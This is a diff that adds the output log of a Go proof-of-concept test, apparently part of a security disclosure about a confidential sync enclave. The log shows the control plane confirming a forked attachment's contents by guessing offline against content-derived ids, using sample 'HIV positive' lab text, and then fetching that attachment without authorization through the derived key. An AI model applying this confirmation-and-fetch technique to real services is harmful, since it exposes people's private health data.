@@ -1,0 +1,12 @@
+go version go1.27.1 linux/amd64
+=== RUN   TestDisclosure12_ForkedAttachmentKeyDerivableByControlPlane
+    poc_attachment_key_test.go:259: CP saw: PUT /api/sync/blob/chat/chat-victim-1-branch X-Idempotency-Key=68d231bac63d4ad7cc1e72b92a116fd4 X-Clerk-User-Id=user_victim; attachment-index src=29d46b942a7e1b7838ec02f28df950d03202 fork=937bf0b4231d6bc369ad326443de2c3fa1f6
+    poc_attachment_key_test.go:274: offline guess "{\"textContent\":\"Lab result: HIV negative. Patient: J. Doe\"}" -> id 8161c5a3e1d150c593c60080b37800271ced match=false
+    poc_attachment_key_test.go:274: offline guess "{\"textContent\":\"Lab result: HIV positive. Patient: J. Doe\"}" -> id 937bf0b4231d6bc369ad326443de2c3fa1f6 match=true
+    poc_attachment_key_test.go:274: offline guess "{\"textContent\":\"Lab result: inconclusive. Patient: J. Doe\"}" -> id 7add19e770dce00a0fa6b37cf52c95c1555c match=false
+    poc_attachment_key_test.go:282: RESULT offline: CP confirmed forked attachment 937bf0b4231d6bc369ad326443de2c3fa1f6 content without any user secret
+    poc_attachment_key_test.go:289: RESULT get-public (no Authorization header) with CP-derived key: 200 "{\"textContent\":\"Lab result: HIV positive. Patient: J. Doe\"}"
+    poc_attachment_key_test.go:297: CONTROL wrong-guess key -> 400 {"code":"BAD_REQUEST","message":"attachment key does not match","ok":false}
+--- PASS: TestDisclosure12_ForkedAttachmentKeyDerivableByControlPlane (0.03s)
+PASS
+ok  	github.com/tinfoilsh/confidential-sync-enclave/internal/localstack/smoke	0.040s
